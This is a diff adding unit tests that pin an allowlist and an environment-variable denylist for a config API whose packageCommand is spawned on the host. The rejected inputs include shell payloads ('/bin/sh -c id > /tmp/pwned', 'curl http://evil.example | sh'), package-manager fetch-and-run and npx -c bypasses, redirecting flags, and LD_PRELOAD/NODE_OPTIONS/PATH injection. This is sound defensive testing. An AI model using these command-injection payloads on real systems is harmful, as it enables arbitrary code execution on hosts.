@@ -1497,4 +1497,383 @@ describe('updateConfig', () => {
     expect(result.restartRequired).toEqual([]);
     expect(result.envOverridden).toEqual(['region']);
   });
+
+  // PUT /api/config is unauthenticated and `packageCommand` is spawned by
+  // serverless-packager (spawn(firstToken, restTokens), with `packageArgs`
+  // appended) on the next POST /api/services/package. Without a fence that pair
+  // is arbitrary code execution on the host, which is what these tests pin.
+  describe('packageCommand runner allowlist', () => {
+    const RUNNERS = 'npm, npx, yarn, pnpm, serverless, sls, osls';
+
+    it('rejects the /bin/sh + packageArgs chain — nothing reaches the file', () => {
+      const cm = setupFile({});
+      // The demonstrated payload, verbatim: a shell as the command and the
+      // real work smuggled in as argv (packageArgs bypasses the tokenizer
+      // entirely, so a valid-looking string array is all the attacker needs).
+      const err = updateErr(cm, {
+        packageCommand: '/bin/sh',
+        packageArgs: ['-c', 'id > /tmp/pwned'],
+      });
+      expect(err.name).toBe('ConfigValidationError');
+      expect(err.details).toEqual([
+        `"packageCommand" must start with one of: ${RUNNERS} — "/bin/sh" is not an allowed package runner`,
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('rejects interpreters, absolute paths and every path spelling', () => {
+      const cm = setupFile({});
+      const rejected: Array<[string, string]> = [
+        ['bash -c "id"', 'bash'],
+        ['curl http://evil.example | sh', 'curl'],
+        ['node -e "require(\'child_process\').exec(\'id\')"', 'node'],
+        ['/usr/local/bin/npm run package', '/usr/local/bin/npm'],
+        // A relative path is still a path: it names a binary the caller
+        // planted, not a runner on PATH.
+        ['./npm package', './npm'],
+        ['../../tools/npm package', '../../tools/npm'],
+        ['node_modules/.bin/serverless package', 'node_modules/.bin/serverless'],
+        ['C:\\Windows\\System32\\cmd.exe /c id', 'C:\\Windows\\System32\\cmd.exe'],
+        // `env` reaches any binary with any environment — the whole point of
+        // the allowlist, one indirection away.
+        ['env NODE_OPTIONS=--require=/tmp/x.js npm run package', 'env'],
+        // Quoting must not launder the token: the packager strips the quotes
+        // before spawning, so validation strips them too.
+        ['"/bin/sh" -c id', '/bin/sh'],
+        ["'/bin/sh' -c id", '/bin/sh'],
+        // A near-miss on an allowed name is still not that name.
+        ['npmx run package', 'npmx'],
+        ['NPM run package', 'NPM'],
+      ];
+      for (const [command, runner] of rejected) {
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand" must start with one of: ${RUNNERS} — "${runner}" is not an allowed package runner`,
+        ]);
+      }
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('rejects a command that tokenizes to nothing, and a non-string', () => {
+      const cm = setupFile({});
+      // Whitespace only: non-empty as a string, but the packager would spawn
+      // nothing at all, so it reports the same "not an allowed runner" verdict
+      // with an empty token rather than slipping through.
+      expect(updateErr(cm, { packageCommand: '   ' }).details).toEqual([
+        `"packageCommand" must start with one of: ${RUNNERS} — "" is not an allowed package runner`,
+      ]);
+      // The plain string checks still run first.
+      expect(updateErr(cm, { packageCommand: '' }).details).toEqual([
+        '"packageCommand" must be a non-empty string',
+      ]);
+      expect(updateErr(cm, { packageCommand: 123 }).details).toEqual([
+        '"packageCommand" must be a non-empty string',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('fences the per-service copy the same way, reporting the entry path', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, {
+        servicePackaging: { access: { packageCommand: '/bin/sh', packageArgs: ['-c', 'id'] } },
+      }).details).toEqual([
+        `"servicePackaging.access.packageCommand" must start with one of: ${RUNNERS} — "/bin/sh" is not an allowed package runner`,
+      ]);
+      expect(updateErr(cm, {
+        servicePackaging: { access: { packageCommand: '' } },
+      }).details).toEqual([
+        '"servicePackaging.access.packageCommand" must be a non-empty string',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // The bypass that survived the first version of this fence: every allowed
+    // runner is itself an interpreter one subcommand in, and
+    // `spawn('npm', ['exec','-c','<shell string>'])` executes that string with
+    // no shell:true anywhere. Checking the first token alone let all of these
+    // through while reporting "npm"/"npx"/"yarn"/"pnpm" as an allowed runner.
+    it('rejects the interpreter subcommands of the allowed runners', () => {
+      const cm = setupFile({});
+      const rejected: Array<[string, string, string]> = [
+        // Reads its payload straight off the argv — a shell on the host.
+        ['npm exec -c "touch /tmp/RCE_PROOF && id -un > /tmp/RCE_PROOF"', 'npm', 'exec'],
+        ['npm x -c "id"', 'npm', 'x'],
+        // Fetch-and-run: the package is the caller's, not the project's.
+        ['npm exec -p evil-pkg -- evil', 'npm', 'exec'],
+        ['yarn dlx evil-pkg', 'yarn', 'dlx'],
+        ['pnpm dlx evil-pkg', 'pnpm', 'dlx'],
+        ['npm install evil-pkg', 'npm', 'install'],
+        ['yarn add evil-pkg', 'yarn', 'add'],
+        // Install scripts of a fetched package run as this user, so `add`/`i`
+        // are fetch-and-run with an extra step, not an installer.
+        ['npm i evil-pkg', 'npm', 'i'],
+        // Straight interpreters, reached through the manager's own builtins.
+        ['yarn node -e "require(\'child_process\').exec(\'id\')"', 'yarn', 'node'],
+        ['yarn exec sh -c id', 'yarn', 'exec'],
+        ['pnpm exec sh -c id', 'pnpm', 'exec'],
+        ['yarn create evil-app', 'yarn', 'create'],
+        // yarn 1's implicit `run` is what makes `yarn node` and `yarn dlx`
+        // indistinguishable from a script name, so the explicit form is
+        // required — `yarn run package`, not `yarn package`.
+        ['yarn package', 'yarn', 'package'],
+        ['pnpm package', 'pnpm', 'package'],
+        // The Serverless CLIs fetch and run code too, one verb over.
+        ['serverless plugin install --name evil-plugin', 'serverless', 'plugin'],
+        ['sls plugin install --name evil-plugin', 'sls', 'plugin'],
+        ['osls plugin install --name evil-plugin', 'osls', 'plugin'],
+      ];
+      const verbsOf: Record<string, string> = {
+        npm: '"run" or "run-script"',
+        yarn: '"run"',
+        pnpm: '"run"',
+        serverless: '"package"',
+        sls: '"package"',
+        osls: '"package"',
+      };
+      for (const [command, runner, verb] of rejected) {
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand": "${runner}" may only be followed by ${verbsOf[runner]} — `
+            + `"${verb}" can run a program the caller chose instead of the project's build`,
+        ]);
+      }
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // A runner with no subcommand at all is the same bypass with the verb moved
+    // into `packageArgs` (which reaches spawn() without a tokenizer), so the
+    // command has to carry it.
+    it('rejects a bare runner, including the packageArgs-smuggled spelling', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, {
+        packageCommand: 'npm',
+        packageArgs: ['exec', '-c', 'id > /tmp/pwned'],
+      }).details).toEqual([
+        '"packageCommand": "npm" may only be followed by "run" or "run-script" — the command names no subcommand at all',
+      ]);
+      expect(updateErr(cm, { packageCommand: 'serverless' }).details).toEqual([
+        '"packageCommand": "serverless" may only be followed by "package" — the command names no subcommand at all',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // npx is a launcher, so it is stripped and what it launches is held to the
+    // same grammar. `npx -c '<shell>'` was the shortest RCE of the whole set.
+    it('lets npx run only the Serverless CLI, and carry only -y/--yes', () => {
+      const cm = setupFile({});
+      const badFlags = ['npx -c "id > /tmp/pwned"', 'npx --call "id"', 'npx -p evil-pkg serverless package', 'npx -y -c "id"'];
+      for (const command of badFlags) {
+        const flag = command.split(' ')[command.startsWith('npx -y') ? 2 : 1];
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand": npx may carry only "-y" or "--yes" before the package name — "${flag}" can name another package to run, or a command string to run as a shell`,
+        ]);
+      }
+      const badPackages: Array<[string, string]> = [
+        ['npx evil-pkg', 'evil-pkg'],
+        ['npx -y evil-pkg --run', 'evil-pkg'],
+        ['npx node -e "id"', 'node'],
+        // A scoped name keeps its leading @ — that one is a scope, not a
+        // version pin, so it is compared whole and matches nothing.
+        ['npx @evil/serverless package', '@evil/serverless'],
+        // npx with nothing to launch names no program either way.
+        ['npx', ''],
+        ['npx -y', ''],
+      ];
+      for (const [command, spec] of badPackages) {
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand": npx may only run the Serverless CLI (serverless, sls, osls) — "${spec}" is a package of the caller's choosing`,
+        ]);
+      }
+      // …and the CLI it launches still owes the grammar its own verb.
+      expect(updateErr(cm, { packageCommand: 'npx serverless plugin install --name evil' }).details).toEqual([
+        '"packageCommand": "serverless" may only be followed by "package" — "plugin" can run a program the caller chose instead of the project\'s build',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // The grammar pins the program; these flags re-point it at another one
+    // without changing a single positional token.
+    it('rejects flags that redirect an otherwise-allowed command', () => {
+      const cm = setupFile({});
+      const rejected = [
+        // npm picks the binary that interprets the script.
+        'npm run package --script-shell=/tmp/evil',
+        // The flag spelling of the NODE_OPTIONS that packageEnv already blocks.
+        'npm run package --node-options=--require /tmp/x.js',
+        // Dashes and case are cosmetic to a config key, so they are stripped
+        // before the comparison.
+        'npm run package --nodeOptions=--require /tmp/x.js',
+        // Another rc file can set script-shell/node-options/yarn-path.
+        'npm run package --userconfig /tmp/evil-npmrc',
+        'yarn run package --use-yarnrc /tmp/evil-yarnrc',
+        // npx fetches the CLI when the service has no local copy, and npm reads
+        // its own config flags from anywhere in the argv — so the registry the
+        // fetch uses is still the caller's choice unless this is refused.
+        'npx serverless package --registry=http://evil.example',
+        // Run the scripts of a package.json the caller planted elsewhere.
+        'npm run package --prefix /tmp/evil',
+        'pnpm run package --dir /tmp/evil',
+        // node's own code loaders, refused wherever they appear.
+        'npx serverless package --require /tmp/x.js',
+      ];
+      for (const command of rejected) {
+        const flag = command.split(' ').find(t => t.startsWith('-')) as string;
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand" cannot contain "${flag}" — that flag points the package command at a program, shell or config file of the caller's choosing`,
+        ]);
+      }
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // packageArgs is appended to the same argv with no tokenizer in between, so
+    // it answers to the same flag screen — global and per-service.
+    it('screens packageArgs for the same redirecting flags', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, {
+        packageCommand: 'npm run package',
+        packageArgs: ['--stage=dev', '--node-options=--require /tmp/x.js'],
+      }).details).toEqual([
+        '"packageArgs[1]" cannot contain "--node-options=--require /tmp/x.js" — that flag points the package command at a program, shell or config file of the caller\'s choosing',
+      ]);
+      expect(updateErr(cm, {
+        servicePackaging: { access: { packageArgs: ['--script-shell=/tmp/evil'] } },
+      }).details).toEqual([
+        '"servicePackaging.access.packageArgs[0]" cannot contain "--script-shell=/tmp/evil" — that flag points the package command at a program, shell or config file of the caller\'s choosing',
+      ]);
+      // The shape error still comes first and keeps its wording.
+      expect(updateErr(cm, { packageArgs: ['ok', 7] }).details).toEqual([
+        '"packageArgs" must be an array of strings',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // The dashboard (OnboardingPage/SettingsPage) writes exactly these shapes
+    // through PUT /api/config; the fence must not cost the onboarding flow a
+    // single legitimate command.
+    it('accepts every legitimate packaging command, global and per-service', () => {
+      const accepted = [
+        'npx serverless package', // the LSS default
+        'npm run package',
+        'npm run package:local',
+        'npm run-script package',
+        'yarn run package',
+        'pnpm run package',
+        'serverless package --stage dev',
+        'sls package',
+        'osls package',
+        'npx sls package --param="custom-stage=offline"',
+        // `-y` is the one npx flag that only answers a prompt.
+        'npx -y serverless package',
+        // A version pin names the same program.
+        'npx serverless@3.38.0 package',
+        // Serverless's own short flags stay usable: -c/-p/-r are --config,
+        // --package and --region there, so the screen never claims them.
+        'sls package -c custom.yml -p .build -r us-east-1',
+        // Quoted runner: the packager unquotes before spawning, so validation
+        // sees the same `npm` it does.
+        '"npm" run package',
+      ];
+      for (const command of accepted) {
+        const cm = setupFile({});
+        cm.updateConfig({ packageCommand: command, servicePackaging: { access: { packageCommand: command } } });
+        expect(written().packageCommand).toBe(command);
+        expect(written().servicePackaging).toEqual({ access: { packageCommand: command } });
+      }
+      // The documented packageArgs example is untouched by the flag screen.
+      const cm = setupFile({});
+      cm.updateConfig({ packageArgs: ['--param=custom-stage=offline'] });
+      expect(written().packageArgs).toEqual(['--param=custom-stage=offline']);
+    });
+  });
+
+  describe('packageEnv loader-hook denylist', () => {
+    it('rejects NODE_OPTIONS — code injection that ignores which binary ran', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, { packageEnv: { NODE_OPTIONS: '--require /tmp/x.js' } }).details).toEqual([
+        '"packageEnv.NODE_OPTIONS" cannot be set — it injects code into the packaging process',
+      ]);
+      // Windows env lookup is case-insensitive, so the lowercase spelling is
+      // the identical bypass and is compared the same way.
+      expect(updateErr(cm, { packageEnv: { node_options: '--require /tmp/x.js' } }).details).toEqual([
+        '"packageEnv.node_options" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(updateErr(cm, { packageEnv: { Node_Options: '--require /tmp/x.js' } }).details).toEqual([
+        '"packageEnv.Node_Options" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // PATH is the member that reads as configuration rather than as an attack.
+    // The packager spawns without a shell, but the shell was never what found
+    // the binary: libuv execvp()s with the CHILD's environment, so the child's
+    // PATH picks which file named `npm` runs. Verified by planting an
+    // executable named `npm` on a prepended directory — it ran. Allowing it
+    // would hand back exactly what ALLOWED_PACKAGE_RUNNERS takes away.
+    it('rejects PATH and NODE_PATH — they choose which binary the runner allowlist resolves to', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, { packageEnv: { PATH: '/tmp/evil:/usr/bin' } }).details).toEqual([
+        '"packageEnv.PATH" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(updateErr(cm, { packageEnv: { path: '/tmp/evil' } }).details).toEqual([
+        '"packageEnv.path" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(updateErr(cm, { packageEnv: { NODE_PATH: '/tmp/evil' } }).details).toEqual([
+        '"packageEnv.NODE_PATH" cannot be set — it injects code into the packaging process',
+      ]);
+      // The per-service map carries the same fence as the global one.
+      expect(updateErr(cm, {
+        servicePackaging: { svc: { packageEnv: { PATH: '/tmp/evil' } } },
+      }).details).toEqual([
+        '"servicePackaging.svc.packageEnv.PATH" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('rejects every linker/interpreter hook, in both env maps', () => {
+      const cm = setupFile({});
+      const blocked = [
+        'NODE_OPTIONS',
+        'NODE_REPL_EXTERNAL_MODULE',
+        'LD_PRELOAD',
+        'LD_AUDIT',
+        'LD_LIBRARY_PATH',
+        'DYLD_INSERT_LIBRARIES',
+        'DYLD_LIBRARY_PATH',
+        'PATH',
+        'NODE_PATH',
+      ];
+      for (const name of blocked) {
+        expect(updateErr(cm, { packageEnv: { [name]: '/tmp/evil.so' } }).details).toEqual([
+          `"packageEnv.${name}" cannot be set — it injects code into the packaging process`,
+        ]);
+        expect(updateErr(cm, {
+          servicePackaging: { access: { packageEnv: { [name]: '/tmp/evil.so' } } },
+        }).details).toEqual([
+          `"servicePackaging.access.packageEnv.${name}" cannot be set — it injects code into the packaging process`,
+        ]);
+      }
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('reports the value-shape error before the key check', () => {
+      // Same message as any other string record — a non-string value never
+      // reaches the key scan.
+      expect(updateErr(setupFile({}), { packageEnv: { NODE_OPTIONS: 1 } }).details).toEqual([
+        '"packageEnv" must be an object of string values',
+      ]);
+    });
+
+    it('leaves ordinary packaging env vars alone, and only fences env maps', () => {
+      const cm = setupFile({});
+      cm.updateConfig({
+        packageEnv: { NPM_TOKEN: 's3cret', SLS_DEBUG: '*', AWS_PROFILE: 'dev' },
+        servicePackaging: { access: { packageEnv: { STAGE: 'offline' } } },
+        // A branding token that merely SHARES a blocked name is still just a
+        // CSS value: the denylist applies to maps that become a child's
+        // environment, not to every string record.
+        branding: { colors: { NODE_OPTIONS: '#fff' } },
+      });
+      expect(written().packageEnv).toEqual({ NPM_TOKEN: 's3cret', SLS_DEBUG: '*', AWS_PROFILE: 'dev' });
+      expect(written().servicePackaging).toEqual({ access: { packageEnv: { STAGE: 'offline' } } });
+      expect(written().branding).toEqual({ colors: { NODE_OPTIONS: '#fff' } });
+    });
+  });
 });
